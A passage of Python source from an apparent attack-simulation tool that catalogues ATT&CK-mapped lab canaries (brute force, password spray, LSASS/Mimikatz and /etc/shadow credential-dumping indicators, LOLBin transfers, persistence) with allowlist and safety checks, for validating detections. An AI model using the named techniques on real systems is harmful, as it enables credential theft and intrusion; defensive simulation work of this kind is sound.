        expected_telemetry=["multiple 404 statuses", "CMS/admin paths", "same source correlation", "not_found_burst alert"],
        safety_controls=["six fixed paths only", "lab server only", "no directory brute force", "no recursion"],
        steps=[
            "Request a fixed list of common admin and technology paths.",
            "Observe real NGINX 404 access log lines from the attacked server.",
            "Validate detection logic for short path-discovery bursts.",
        ],
        emits_network_traffic=True,
    ),
    Simulation(
        id="sim-t1595-tool-user-agent-fingerprint",
        technique_id="T1595",
        name="Scanner and tool user-agent fingerprinting",
        category="reconnaissance",
        risk_level=1,
        target_types=["http", "https", "web"],
        description="Send real HTTP requests with fixed scanner/tool user-agents to validate server-side telemetry and parser coverage.",
        expected_telemetry=["curl user-agent", "python-requests user-agent", "sqlmap user-agent", "Nmap NSE user-agent", "tool_user_agent alert"],
        safety_controls=["lab server only", "fixed benign requests", "no exploit payload", "no scan volume"],
        steps=[
            "Send benign requests with tool-like user-agent headers.",
            "Record headers in structured web telemetry and real access logs.",
            "Validate detections that key on tool fingerprints and request context.",
        ],
        emits_network_traffic=True,
    ),
    Simulation(
        id="sim-t1110-basic-auth-bruteforce",
        technique_id="T1110.001",
        name="HTTP Basic authentication brute-force sequence",
        category="credential-attack",
        risk_level=2,
        target_types=["http", "https", "web"],
        description="Perform a fixed lab-only Basic auth sequence against the attacked web server and record auth/access/security telemetry.",
        expected_telemetry=["Authorization header present", "401 failures", "final 200 success", "basic_auth_bruteforce alert", "auth log password hash"],
        safety_controls=["lab credentials only", "three requests only", "authorization header redacted in stored telemetry", "no external target"],
        steps=[
            "Send two failed Basic auth requests for the lab admin user.",
            "Send one known-good lab Basic auth request for success telemetry.",
            "Validate access, auth, and WAF-style detection output.",
        ],
        emits_network_traffic=True,
    ),
    Simulation(
        id="sim-t1505-suspicious-extension-upload",
        technique_id="T1505.003",
        name="Suspicious web extension upload",
        category="persistence-canary",
        risk_level=1,
        target_types=["http", "https", "web"],
        description="POST benign upload bodies to suspicious web extension paths so the attacked server emits real upload telemetry.",
        expected_telemetry=["POST upload paths", "php/aspx/jsp extension", "body length/hash", "suspicious_upload alert"],
        safety_controls=["benign payload text only", "no file is persisted", "lab server only", "fixed extension list"],
        steps=[
            "POST benign bodies to PHP, ASPX, and JSP upload paths.",
            "Record real access log lines and structured body metadata.",
            "Validate detections for suspicious server-side extension upload attempts.",
        ],
        emits_network_traffic=True,
    ),
    Simulation(
        id="sim-t1003-shadow-file-access",
        technique_id="T1003.008",
        name="Linux /etc/shadow access canary",
        category="credential-dumping-canary",
        risk_level=2,
        target_types=["endpoint", "linux-endpoint"],
        description="Generate lab-only internal activity telemetry for attempted Linux shadow credential-file access without reading any real files.",
        expected_telemetry=["process/file access event", "/etc/shadow path", "read/copy operation", "credential_file_access alert", "run correlation ID"],
        safety_controls=["canary event only", "no real file read", "no host /etc/shadow access", "local lab server only", "fixed payloads"],
        steps=[
            "POST fixed internal-activity canaries to the lab target.",
            "The attacked server records process/file telemetry but does not read or copy /etc/shadow.",
            "Validate detection logic for credential-file access and suspicious shadow file handling.",
        ],
        emits_network_traffic=True,
    ),
    Simulation(
        id="sim-t1003-lsass-mimikatz-canary",
        technique_id="T1003.001",
        name="LSASS and Mimikatz usage canary",
        category="credential-dumping-canary",
        risk_level=2,
        target_types=["endpoint", "windows-endpoint"],
        description="Generate lab-only process telemetry for Mimikatz/LSASS dumping patterns without running tools or touching memory.",
        expected_telemetry=["process command line", "lsass.exe target", "mimikatz indicator", "credential_dumping alert", "run correlation ID"],
        safety_controls=["canary event only", "no Mimikatz execution", "no memory dump", "no credential access", "local lab server only"],
        steps=[
            "POST fixed process telemetry canaries to the lab target.",
            "The attacked server records command-line-shaped telemetry but never executes Mimikatz, rundll32, or ProcDump.",
            "Validate detections for LSASS access, Mimikatz command strings, and suspicious dump command lines.",
        ],
        emits_network_traffic=True,
    ),
    Simulation(
        id="sim-t1059-powershell-encoded-command",
        technique_id="T1059.001",
        name="PowerShell encoded command execution",
        category="execution-canary",
        risk_level=2,
        target_types=["endpoint", "windows-endpoint"],
        description="Generate endpoint process telemetry for encoded PowerShell execution patterns without running commands.",
        expected_telemetry=["Sysmon process creation", "powershell.exe or pwsh.exe", "EncodedCommand flag", "hidden/no-profile flags", "run correlation ID"],
        safety_controls=["endpoint telemetry fixture only", "no command execution", "fixed command-line canaries", "no external target"],
        steps=[
            "POST fixed PowerShell process-create canaries to the endpoint lab target.",
            "The endpoint fixture records Sysmon-style process events only.",
            "Validate detection logic for encoded PowerShell and bypass-style flags.",
        ],
        emits_network_traffic=True,
    ),
    Simulation(
        id="sim-t1059-cmd-shell-execution",
        technique_id="T1059.003",
        name="Windows command shell execution",
        category="execution-canary",
        risk_level=1,
        target_types=["endpoint", "windows-endpoint"],
        description="Generate endpoint process telemetry for cmd.exe shell execution patterns without running commands.",
        expected_telemetry=["Sysmon process creation", "cmd.exe", "/c command flag", "discovery command string", "run correlation ID"],
        safety_controls=["endpoint telemetry fixture only", "no shell execution", "fixed command-line canaries"],
        steps=[
            "POST cmd.exe process-create canaries to the endpoint lab target.",
            "Record command-line-shaped telemetry without creating a shell.",
            "Validate command-shell execution detections.",
        ],
        emits_network_traffic=True,
    ),
    Simulation(
        id="sim-t1105-certutil-transfer",
        technique_id="T1105",
        name="Certutil and BITS ingress tool transfer",
        category="transfer-canary",
        risk_level=2,
        target_types=["endpoint", "windows-endpoint"],
        description="Generate endpoint process telemetry for LOLBin-based tool transfer commands without downloading files.",
        expected_telemetry=["certutil.exe", "bitsadmin.exe", "URL in command line", "destination path", "process creation"],
        safety_controls=["no network download", "no file write", "endpoint telemetry fixture only", "fixed canaries"],
        steps=[
            "POST certutil and BITS command-line canaries to the endpoint target.",
            "Record process creation telemetry with URL and destination path indicators.",
            "Validate ingress tool transfer detections without transferring content.",
        ],
        emits_network_traffic=True,
    ),
    Simulation(
        id="sim-t1547-run-key-persistence",
        technique_id="T1547.001",
        name="Registry Run key persistence",
        category="persistence-canary",
        risk_level=2,
        target_types=["endpoint", "windows-endpoint"],
        description="Generate registry-set telemetry for Run key persistence patterns without modifying a registry.",
        expected_telemetry=["Registry value set", "HKCU Run key", "reg.exe or PowerShell", "persistence alert", "run correlation ID"],
        safety_controls=["no real registry write", "endpoint telemetry fixture only", "fixed key path"],
        steps=[
            "POST Run-key persistence canaries to the endpoint target.",
            "Record registry-set shaped telemetry with the Run key path.",
            "Validate persistence detection logic for autorun registry keys.",
        ],
        emits_network_traffic=True,
    ),
    Simulation(
        id="sim-t1053-scheduled-task",
        technique_id="T1053.005",
        name="Scheduled task creation",
        category="persistence-canary",
        risk_level=2,
        target_types=["endpoint", "windows-endpoint"],
        description="Generate scheduled-task creation telemetry without creating a task.",
        expected_telemetry=["schtasks.exe", "Register-ScheduledTask", "task name", "process creation", "scheduled_task alert"],
        safety_controls=["no task creation", "endpoint telemetry fixture only", "fixed task name"],
        steps=[
            "POST schtasks and PowerShell scheduled-task canaries.",
            "Record process telemetry for task creation patterns.",
            "Validate scheduled-task persistence detections.",
        ],
        emits_network_traffic=True,
    ),
    Simulation(
        id="sim-t1543-service-creation",
        technique_id="T1543.003",
        name="Windows service creation",
        category="persistence-canary",
        risk_level=2,
        target_types=["endpoint", "windows-endpoint"],
        description="Generate service-creation telemetry without creating a service.",
        expected_telemetry=["sc.exe create", "New-Service", "service name", "binary path", "service_creation alert"],
        safety_controls=["no service creation", "endpoint telemetry fixture only", "fixed service name"],
        steps=[
            "POST service creation command-line canaries.",
            "Record process telemetry with service name and binary path indicators.",
            "Validate service persistence detections.",
        ],
        emits_network_traffic=True,
    ),
    Simulation(
        id="sim-t1218-rundll32-proxy",
        technique_id="T1218.011",
        name="Rundll32 signed binary proxy execution",
        category="defense-evasion-canary",
        risk_level=2,
        target_types=["endpoint", "windows-endpoint"],
        description="Generate rundll32 proxy-execution telemetry without loading DLLs or scripts.",
        expected_telemetry=["rundll32.exe", "suspicious command line", "DLL/function launch", "process creation"],
        safety_controls=["no DLL load", "no script execution", "endpoint telemetry fixture only"],
        steps=[
            "POST rundll32 command-line canaries to the endpoint target.",
            "Record process creation telemetry only.",
            "Validate signed-binary proxy execution detections.",
        ],
        emits_network_traffic=True,
    ),
    Simulation(
        id="sim-t1218-regsvr32-proxy",
        technique_id="T1218.010",
        name="Regsvr32 signed binary proxy execution",
        category="defense-evasion-canary",
        risk_level=2,
        target_types=["endpoint", "windows-endpoint"],
        description="Generate regsvr32 proxy-execution telemetry without registering DLLs or fetching scriptlets.",
        expected_telemetry=["regsvr32.exe", "scrobj.dll", "scriptlet URL", "process creation", "proxy execution alert"],
        safety_controls=["no DLL registration", "no network fetch", "endpoint telemetry fixture only"],
        steps=[
            "POST regsvr32 scriptlet and DLL-registration canaries.",
            "Record process creation telemetry with proxy-execution indicators.",
            "Validate regsvr32 LOLBin detections.",
        ],
        emits_network_traffic=True,
    ),
    Simulation(
        id="sim-t1082-system-discovery",
        technique_id="T1082",
        name="System information discovery",
        category="discovery-canary",
        risk_level=1,
        target_types=["endpoint", "windows-endpoint"],
        description="Generate process telemetry for common system discovery commands without executing them.",
        expected_telemetry=["systeminfo.exe", "whoami.exe", "ipconfig.exe", "process creation", "discovery command sequence"],
        safety_controls=["no command execution", "endpoint telemetry fixture only", "fixed discovery commands"],
        steps=[
            "POST systeminfo, whoami, and ipconfig process canaries.",
            "Record endpoint process telemetry for discovery command sequence detection.",
            "Validate discovery detections and correlation logic.",
        ],
        emits_network_traffic=True,
    ),
    Simulation(
        id="sim-t1083-file-discovery",
        technique_id="T1083",
        name="File and directory discovery",
        category="discovery-canary",
        risk_level=1,
        target_types=["endpoint", "windows-endpoint"],
        description="Generate file-discovery telemetry without traversing the filesystem.",
        expected_telemetry=["cmd dir", "PowerShell Get-ChildItem", "target path", "file_discovery alert", "run correlation ID"],
        safety_controls=["no filesystem traversal", "endpoint telemetry fixture only", "fixed public path"],
        steps=[
            "POST cmd and PowerShell file-discovery canaries.",
            "Record file-discovery shaped telemetry without touching real files.",
            "Validate file and directory discovery detections.",
        ],
        emits_network_traffic=True,
    ),
    Simulation(
        id="sim-t1033-user-discovery",
        technique_id="T1033",
        name="System owner and user discovery",
        category="discovery-canary",
        risk_level=1,
        target_types=["endpoint", "windows-endpoint"],
        description="Generate user-discovery process telemetry without running commands.",
        expected_telemetry=["whoami.exe", "username environment lookup", "process creation", "user_discovery alert"],
        safety_controls=["no command execution", "endpoint telemetry fixture only", "fixed discovery commands"],
        steps=[
            "POST user-discovery process canaries to the endpoint target.",
            "Record Sysmon-style process telemetry with user-discovery command lines.",
            "Validate system-owner/user discovery detections.",
        ],
        emits_network_traffic=True,
    ),
    Simulation(
        id="sim-t1057-process-discovery",
        technique_id="T1057",
        name="Process discovery",
        category="discovery-canary",
        risk_level=1,
        target_types=["endpoint", "windows-endpoint"],
        description="Generate process-discovery telemetry without listing real processes.",
        expected_telemetry=["tasklist.exe", "Get-Process", "process creation", "process_discovery alert"],
        safety_controls=["no process enumeration", "endpoint telemetry fixture only", "fixed discovery commands"],
        steps=[
            "POST tasklist and PowerShell process-discovery canaries.",
            "Record process telemetry without enumerating the host.",
            "Validate process discovery detections.",
        ],
        emits_network_traffic=True,
    ),
    Simulation(
        id="sim-t1016-network-config-discovery",
        technique_id="T1016",
        name="System network configuration discovery",
        category="discovery-canary",
        risk_level=1,
        target_types=["endpoint", "windows-endpoint"],
        description="Generate network-configuration discovery telemetry without querying host networking.",
        expected_telemetry=["ipconfig.exe", "netsh.exe", "interface discovery", "network_config_discovery alert"],
        safety_controls=["no network configuration query", "endpoint telemetry fixture only", "fixed discovery commands"],
        steps=[
            "POST ipconfig and netsh discovery canaries.",
            "Record process telemetry with network-configuration indicators.",
            "Validate network configuration discovery detections.",
        ],
        emits_network_traffic=True,
    ),
    Simulation(
        id="sim-t1018-remote-system-discovery",
        technique_id="T1018",
        name="Remote system discovery",
        category="discovery-canary",
        risk_level=1,
        target_types=["endpoint", "windows-endpoint"],
        description="Generate remote-system discovery telemetry without querying a domain or network.",
        expected_telemetry=["net view", "nltest dclist", "domain discovery", "remote_system_discovery alert"],
        safety_controls=["no domain query", "no network enumeration", "endpoint telemetry fixture only"],
        steps=[
            "POST net view and nltest discovery canaries.",
            "Record process telemetry with remote-system discovery indicators.",
            "Validate remote system discovery detections.",
        ],
        emits_network_traffic=True,
    ),
    Simulation(
        id="sim-t1518-software-discovery",
        technique_id="T1518",
        name="Software discovery",
        category="discovery-canary",
        risk_level=1,
        target_types=["endpoint", "windows-endpoint"],
        description="Generate installed-software discovery telemetry without querying installed software.",
        expected_telemetry=["wmic product", "PowerShell registry uninstall path", "software_discovery alert"],
        safety_controls=["no registry/software query", "endpoint telemetry fixture only", "fixed discovery commands"],
        steps=[
            "POST WMIC and PowerShell software-discovery canaries.",
            "Record process telemetry with software-discovery indicators.",
            "Validate installed software discovery detections.",
        ],
        emits_network_traffic=True,
    ),
    Simulation(
        id="sim-t1110-web-login-failures",
        technique_id="T1110",
        name="Web failed-login sequence canary",
        category="credential-access",
        risk_level=2,
        target_types=["http", "https", "web"],
        description="Generate low-rate failed-login-shaped telemetry against the lab web server only.",
        expected_telemetry=["login endpoint", "username field", "failed status", "low-rate sequence", "canary classification"],
        safety_controls=["lab server only", "no real accounts", "fixed low rate", "no brute force"],
        steps=[
            "Send three fixed failed-login canaries to the local lab login endpoint.",
            "Record body hash and username-like fields without authenticating.",
            "Validate failed-login sequence detections.",
        ],
        emits_network_traffic=True,
    ),
    Simulation(
        id="sim-t1110-web-bruteforce",
        technique_id="T1110.001",
        name="Web login brute-force sequence",
        category="credential-attack",
        risk_level=2,
        target_types=["http", "https", "web"],
        description="Generate a fixed lab-only brute-force sequence against the built-in auth endpoint.",
        expected_telemetry=["auth log failures", "auth log final success", "same username repeated", "WAF/security brute_force alerts"],
        safety_controls=["lab server only", "fixed test account", "four requests only", "no real credentials", "no external target"],
        steps=[
            "Send a fixed sequence of failed passwords for the admin lab account.",
            "Send one final known-good lab password to prove successful-auth telemetry.",
            "Record access, auth, security, and structured JSONL events with run correlation.",
        ],
        emits_network_traffic=True,
    ),
    Simulation(
        id="sim-t1110-web-password-spray",
        technique_id="T1110.003",
        name="Web password spraying sequence",
        category="credential-attack",
        risk_level=2,
        target_types=["http", "https", "web"],
        description="Generate a fixed password-spray pattern across lab-only users using one incorrect password.",
        expected_telemetry=["auth log failures", "one password across many users", "password_spray security alerts", "source IP correlation"],
        safety_controls=["lab server only", "fixed test users", "one benign password", "four requests only", "no lockout logic"],
        steps=[
            "POST the same incorrect password across a fixed list of lab users.",
            "Record user existence, outcome, failure reason, and source IP without logging the cleartext password.",
            "Validate SIEM detection for one password across multiple accounts.",
        ],
        emits_network_traffic=True,
    ),
    Simulation(
        id="sim-t1589-web-user-enumeration",
        technique_id="T1589.002",
        name="Web user enumeration sequence",
        category="reconnaissance",
        risk_level=1,
        target_types=["http", "https", "web"],
        description="Generate user-enumeration-shaped requests against the built-in auth fixture.",
        expected_telemetry=["username probe", "user exists flag", "unknown user failure", "user_enumeration security alerts"],
        safety_controls=["lab server only", "fixed user list", "no password attack volume", "no external identity provider"],
        steps=[
            "Probe fixed known and unknown lab usernames.",
            "Record whether the auth fixture treated each username as existing.",
            "Validate enumeration detections based on mixed known/unknown user probes.",
        ],
        emits_network_traffic=True,
    ),
    Simulation(
        id="sim-t1071-web-beacon",
        technique_id="T1071.001",
        name="HTTP web beacon canary",
        category="c2-emulation",
        risk_level=2,
        target_types=["http", "https", "web"],
        description="Generate benign periodic HTTP beacon-shaped telemetry to the local lab server.",
        expected_telemetry=["periodic paths", "sequence parameter", "POST telemetry body", "canary classification"],
        safety_controls=["local telemetry server only", "fixed small sequence", "no external C2", "no malware"],
        steps=[
            "Send a short fixed sequence of beacon-shaped GET and POST requests.",
            "Record sequence values and timing.",
            "Validate web-protocol C2 detections on benign lab telemetry.",
        ],
        emits_network_traffic=True,
    ),
    Simulation(
        id="sim-t1041-web-exfil-canary",
        technique_id="T1041",
        name="Web exfiltration-shaped upload canary",
        category="exfiltration-canary",
        risk_level=2,
        target_types=["http", "https", "web"],
        description="Generate small benign exfiltration-shaped uploads to validate outbound/body telemetry parsing.",
        expected_telemetry=["POST body length", "multi-line body", "export endpoint", "canary classification"],
        safety_controls=["small benign payload", "no sensitive data", "local telemetry server only", "no external destination"],
        steps=[
            "POST small benign JSON and text bodies to lab collection endpoints.",
            "Record body metadata without storing sensitive content.",
            "Validate exfiltration-shaped web telemetry detections.",
        ],
        emits_network_traffic=True,
    ),
    Simulation(
        id="sim-t1133-remote-service-reachability",
        technique_id="T1133",
        name="External remote service reachability plan",
        category="remote-access",
        risk_level=1,
        target_types=["vpn", "ssh", "rdp", "remote-service"],
        description="Validate telemetry for approved remote-service reachability checks.",
        expected_telemetry=["firewall deny/allow", "VPN gateway log", "remote access service log"],
        safety_controls=["no authentication attempts", "no brute force", "target allowlist", "single connection intent"],
        steps=[
            "Confirm service and port are approved for reachability validation.",
            "Prepare one low-rate connection attempt without credentials.",
            "Validate firewall and remote-access telemetry.",
            "Record whether alerting exists for unexpected external reachability.",
        ],
    ),
    Simulation(
        id="sim-t1071-controlled-beacon",
        technique_id="T1071",
        name="Controlled HTTP/DNS beacon validation plan",
        category="c2-emulation",
        risk_level=2,
        target_types=["lab-agent", "egress"],
        description="Plan a controlled beacon from a lab agent to a controlled endpoint.",
        expected_telemetry=["DNS resolver log", "proxy log", "NDR metadata", "EDR network event"],
        safety_controls=["lab agent only", "controlled endpoint only", "no malware", "fixed interval cap"],
        steps=[
            "Confirm the target is a lab agent, not a production host.",
            "Prepare a fixed benign HTTP or DNS callback to a controlled domain.",
            "Validate proxy/DNS/NDR/EDR telemetry.",
            "Document periodicity, source process, and destination context.",
        ],
    ),
    Simulation(
        id="sim-t1110-lab-login-sequence",
        technique_id="T1110",
        name="Lab-only failed-login sequence plan",
        category="credential-access",
        risk_level=2,
        target_types=["identity-lab", "sso-lab"],
        description="Plan low-rate failed logins against a lab-only identity target and test account.",
        expected_telemetry=["IdP sign-in log", "MFA log", "VPN/SSO log", "SIEM identity alert"],
        safety_controls=["lab-only target", "test account only", "low rate", "no real users", "explicit approval"],
        steps=[
            "Confirm the identity target is lab-only and uses a test account.",
            "Prepare a low-rate failed-login sequence.",
            "Do not target real users or production identity providers.",
            "Validate failed-login sequence telemetry and alerting.",
        ],
    ),
]

SIMULATIONS.extend(
    Simulation(
        id=atomic_simulation_id(spec),
        technique_id=spec["technique_id"],
        name=f"Atomic event: {spec['name']}",
        category="atomic-event-artifact",
        risk_level=1,
        target_types=["endpoint", "windows-endpoint", "linux-endpoint", "identity-lab", "cloud", "email", "proxy"],
        description=(
            "Generate one high-fidelity vendor-shaped detection-validation event for this ATT&CK technique. "
            "This is artifact telemetry only: no exploit, malware, credential access, or OS command is executed."
        ),
        expected_telemetry=[
            f"{spec['event'].get('provider', 'edr')} event",
            f"event_id={spec['event'].get('event_id', 'ATOMIC')}",
            f"event_name={spec['event'].get('event_name', 'AtomicArtifact')}",
            "ATT&CK technique mapped in simulation metadata",
            "run_id and simulation_id correlation fields",
        ],
        safety_controls=[
            "single event only",
            "local endpoint telemetry fixture only",
            "no command execution",
            "no credential access",
            "no filesystem, registry, cloud, identity, or network changes",
        ],
        steps=[
            "Create one vendor-shaped atomic telemetry event from the curated catalog.",
            "Write the event to the endpoint JSONL and normalized endpoint log.",
            "Validate the SIEM rule trigger using the event fields and ATT&CK mapping.",
        ],
        emits_network_traffic=True,
    )
    for spec in ATOMIC_EVENT_SPECS
)

TARGETS: list[Target] = [
    Target(
        id="lab-web-01",
        name="Docker attack lab web target",
        address=_ATTACK_LAB_WEB_URL,
        target_type="web",
        environment="lab",
        owner="security-team",
        authorization="local-telemetry-fixture",
        allowed_categories=[
            "reconnaissance",
            "initial-access-surface",
            "web-reconnaissance",
            "web-exploit-canary",
            "execution-canary",
            "persistence-canary",
            "transfer-canary",
            "credential-exposure-canary",
            "credential-access",
            "credential-attack",
            "c2-emulation",
            "exfiltration-canary",
        ],
        allowed_simulations=sorted(WEB_SIMULATION_IDS),
        rate_limit="predefined request set only",
        allowed_hours="local lab only",
    ),
    Target(
        id="lab-endpoint-01",
        name="Docker attack lab endpoint target",
        address=_ATTACK_LAB_ENDPOINT_URL,
        target_type="endpoint",
        environment="lab",
        owner="endpoint-security",
        authorization="local-endpoint-telemetry-fixture",
        allowed_categories=[
            "credential-dumping-canary",
            "execution-canary",
            "transfer-canary",
            "persistence-canary",
            "defense-evasion-canary",
            "discovery-canary",
            "atomic-event-artifact",
        ],
        allowed_simulations=sorted(ENDPOINT_SIMULATION_IDS),
        rate_limit="predefined endpoint event set only",
        allowed_hours="local lab only",
    ),
    Target(
        id="lab-idp-01",
        name="Approved lab identity target",
        address="https://idp-lab.example.test",
        target_type="identity-lab",
        environment="lab",
        owner="identity-security",
        authorization="approved-lab-fixture",
        allowed_categories=["credential-access"],
        allowed_simulations=[],
        rate_limit="plan-only until an identity lab fixture is deployed",
    ),
    Target(
        id="lab-egress-agent",
        name="Approved lab egress agent",
        address="agent://lab-egress-agent",
        target_type="lab-agent",
        environment="lab",
        owner="detection-engineering",
        authorization="approved-lab-fixture",
        allowed_categories=["c2-emulation"],
        allowed_simulations=[],
        rate_limit="plan-only until an egress agent fixture is deployed",
    ),
]


def list_simulations() -> list[dict]:
    return [_simulation_dict(item) for item in SIMULATIONS]


def list_targets() -> list[dict]:
    return [_target_dict(item) for item in TARGETS]


def get_simulation(simulation_id: str) -> Simulation | None:
    return next((item for item in SIMULATIONS if item.id == simulation_id), None)


def get_target(target_id: str) -> Target | None:
    return next((item for item in TARGETS if item.id == target_id), None)


def build_plan(simulation_id: str, target_id: str) -> dict:
    simulation = get_simulation(simulation_id)
    target = get_target(target_id)
    if not simulation or not target:
        raise ValueError("Unknown simulation or target")
    allowed, reasons = is_allowed(simulation, target)
    return {
        "plan_id": f"plan-{uuid4()}",
        "simulation": _simulation_dict(simulation),
        "target": _target_dict(target),
        "allowed": allowed,
        "block_reasons": reasons,
        "execution_mode": "dry_run_required",
        "safety_notice": (
            "Attack Simulation runs only predefined benign actions against approved lab fixtures. "
            "It does not run exploit payloads, does not accept arbitrary commands, and does not target user-supplied hosts."
        ),
        "expected_telemetry": simulation.expected_telemetry,
        "steps": simulation.steps,
        "approval_checklist": [
            "Target allowlist entry is registered and approved.",
            "Simulation category is allowed for target.",
            "Analyst reviewed dry-run plan.",
            "Expected telemetry owner is known.",
            "Cleanup and stop criteria are documented.",
        ],
    }


def run_controlled_record(simulation_id: str, target_id: str, analyst_note: str = "") -> dict:
    plan = build_plan(simulation_id, target_id)
    now = datetime.now(timezone.utc).isoformat()
    if not plan["allowed"]:
        return {
            "run_id": f"run-{uuid4()}",
            "status": "blocked",
            "started_at": now,
            "ended_at": now,
            "plan": plan,
            "transcript": ["Simulation blocked by safety policy before execution."],
            "traffic_emitted": False,
            "result": "not_run",
            "validation_status": "not_proven",
            "gaps": plan["block_reasons"],
            "telemetry": {},
        }

    simulation = plan["simulation"]
    target = plan["target"]
    run_id = f"run-{uuid4()}"
    telemetry: dict[str, Any] = {}
    traffic_emitted = False
    result = "telemetry_validation_record_prepared"
    gaps = [
        "Attach SIEM, WAF, firewall, DNS, proxy, EDR, or IdP evidence if validating against enterprise telemetry.",
        "Mark as passed only after telemetry and detection firing are verified.",
    ]
    next_steps = [
        "Review the generated JSONL telemetry log.",
        "Compare the request sequence with expected detection logic.",
        "Record detection result as passed, failed, partial, or not proven.",
    ]

    executed_target_label = ""
    if target["id"] == "lab-web-01" and simulation["id"] in WEB_SIMULATION_IDS:
        telemetry = run_lab_attack_target(
            run_id,
            simulation["id"],
            analyst_note,
            server_url=ensure_lab_web_target(),
            target_kind="web",
        )
        executed_target_label = "web"
        traffic_emitted = True
        result = "local_lab_web_telemetry_collected"
        gaps = telemetry.get("validation_gaps", gaps)
        next_steps = telemetry.get("next_steps", next_steps)
    elif target["id"] == "lab-endpoint-01" and simulation["id"] in ENDPOINT_SIMULATION_IDS:
        telemetry = run_lab_attack_target(
            run_id,
            simulation["id"],
            analyst_note,
            server_url=ensure_lab_endpoint_target(),
            target_kind="endpoint",
        )
        executed_target_label = "endpoint"
        traffic_emitted = True
        result = "local_lab_endpoint_telemetry_collected"
        gaps = telemetry.get("validation_gaps", gaps)
        next_steps = telemetry.get("next_steps", next_steps)

    transcript = [
        f"Prepared {simulation['id']} for target {target['id']}.",
        "Verified target allowlist and simulation-category policy.",
        "Generated expected telemetry checklist.",
        (
            f"Executed predefined local lab {executed_target_label} request set against {target['address']}."
            if traffic_emitted
            else "No network traffic emitted by this simulation runner."
        ),
        "Analyst must validate detection coverage before marking the result as passed.",
    ]
    if telemetry.get("log_file"):
        transcript.append(f"Telemetry log saved: {telemetry['log_file']}")
    if analyst_note:
        transcript.append(f"Analyst note: {analyst_note}")
    return {
        "run_id": run_id,
        "status": "completed_with_local_lab_telemetry" if traffic_emitted else "completed_record_only",
        "started_at": now,
        "ended_at": datetime.now(timezone.utc).isoformat(),
        "plan": plan,
        "transcript": transcript,
        "traffic_emitted": traffic_emitted,
        "result": result,
        "validation_status": "not_proven",
        "gaps": gaps,
        "next_steps": next_steps,
        "telemetry": telemetry,
    }


def is_allowed(simulation: Simulation, target: Target) -> tuple[bool, list[str]]:
    reasons: list[str] = []
    if simulation.destructive:
        reasons.append("Destructive simulations are disabled.")
    if target.environment != "lab":
        reasons.append("Only lab targets are allowed in the MVP.")
    if simulation.id not in target.allowed_simulations:
        reasons.append("Simulation is not allowlisted for this target.")
    if simulation.category not in target.allowed_categories:
        reasons.append("Simulation category is not allowed for this target.")
    if target.target_type not in simulation.target_types:
        reasons.append("Target type does not match simulation target types.")
    if simulation.risk_level > 2:
        reasons.append("Risk level above 2 is disabled.")
    return not reasons, reasons


def _simulation_dict(item: Simulation) -> dict:
    detection_brief = DETECTION_BRIEFS.get(item.id) or None
    return {
        "id": item.id,
        "technique_id": item.technique_id,
        "name": item.name,
        "category": item.category,
        "risk_level": item.risk_level,
        "target_types": item.target_types,
        "description": (detection_brief or {}).get("adversary_activity") or item.description,
        "detection_brief": detection_brief,
        "expected_telemetry": item.expected_telemetry,
        "safety_controls": item.safety_controls,
        "steps": item.steps,
        "destructive": item.destructive,
        "emits_network_traffic": item.emits_network_traffic,
    }


def _target_dict(item: Target) -> dict:
    return {
        "id": item.id,
        "name": item.name,
        "address": item.address,
        "target_type": item.target_type,
        "environment": item.environment,
        "owner": item.owner,
        "authorization": item.authorization,
        "allowed_categories": item.allowed_categories,
        "allowed_simulations": item.allowed_simulations,
        "rate_limit": item.rate_limit,
        "allowed_hours": item.allowed_hours,
    }


def run_lab_attack_target(run_id: str, simulation_id: str, analyst_note: str = "", server_url: str | None = None, target_kind: str = "web") -> dict[str, Any]:
    server_url = server_url or ensure_lab_web_target()
    attack_log_file = _attack_log_path(run_id)
    requests_to_send = _web_request_sequence(simulation_id)
    results: list[dict[str, Any]] = []
    started = datetime.now(timezone.utc)
    cleared_logs = clear_shared_lab_web_logs()
    _append_jsonl(
        attack_log_file,
        {
            "timestamp": started.isoformat(),
            "event_type": "attack_run_started",
            "run_id": run_id,
            "simulation_id": simulation_id,
            "target": server_url,
            "analyst_note": analyst_note,
            "cleared_shared_logs": cleared_logs,
        },
    )

    for index, item in enumerate(requests_to_send, start=1):
        event = _send_lab_web_request(
            run_id,
            simulation_id,
            index,
            server_url,
            item["method"],
            item["path"],
            body=item.get("body", ""),
            purpose=item.get("purpose", ""),
            extra_headers=item.get("headers") or {},
        )
        results.append(event)
        _append_jsonl(attack_log_file, event)
        time.sleep(0.15)

    ended = datetime.now(timezone.utc)
    summary = {
        "timestamp": ended.isoformat(),
        "event_type": "attack_run_completed",
        "run_id": run_id,
        "simulation_id": simulation_id,
        "target": server_url,
        "request_count": len(results),
        "success_count": sum(1 for item in results if item.get("ok")),
        "duration_ms": round((ended - started).total_seconds() * 1000, 3),
    }
    _append_jsonl(attack_log_file, summary)

    return {
        "server": _lab_target_info(server_url, target_kind=target_kind),
        "log_file": str(attack_log_file),
        "web_access_log_file": str(_web_access_log_path()),
        "web_server_access_log_file": str(_web_server_access_log_path()),
        "web_security_log_file": str(_web_security_log_path()),
        "web_error_log_file": str(_web_error_log_path()),
        "web_auth_log_file": str(_web_auth_log_path()),
        "endpoint_log_file": str(_endpoint_log_path()),
        "cleared_shared_logs": cleared_logs,
        "request_count": len(results),
        "success_count": summary["success_count"],
        "events": results,
        "summary": summary,
        "validation_gaps": [
            f"Telemetry was collected from the built-in local lab {target_kind} target, not from production telemetry.",
            "Confirm detection coverage by forwarding these logs or reproducing the same safe request set in an authorized detection lab.",
        ],
        "next_steps": [
            "Open the JSONL log file and verify run_id correlation across attack and web access events.",
            "Map observed paths, methods, status codes, and user-agent values into detection logic.",
            "Forward the log file to SIEM/WAF test ingestion if enterprise detection validation is required.",
        ],
    }


def ensure_lab_web_server() -> str:
    global _LAB_WEB_SERVER
    with _LAB_WEB_SERVER_LOCK:
        if _LAB_WEB_SERVER is not None:
            return _LAB_WEB_BASE_URL

        _ensure_log_dir()
        _LAB_WEB_SERVER = ThreadingHTTPServer((_LAB_WEB_HOST, _LAB_WEB_PORT), _TelemetryWebHandler)
        thread = threading.Thread(target=_LAB_WEB_SERVER.serve_forever, name="attack-simulation-lab-web", daemon=True)
        thread.start()
        logger.info("Started Attack Simulation telemetry web server on %s", _LAB_WEB_BASE_URL)
    return _LAB_WEB_BASE_URL


def ensure_lab_web_target() -> str:
    target_url = os.environ.get("ATTACK_LAB_WEB_URL", _DEFAULT_ATTACK_LAB_WEB_URL).rstrip("/")
    if target_url != _DEFAULT_ATTACK_LAB_WEB_URL:
        return target_url
    return ensure_lab_web_server()


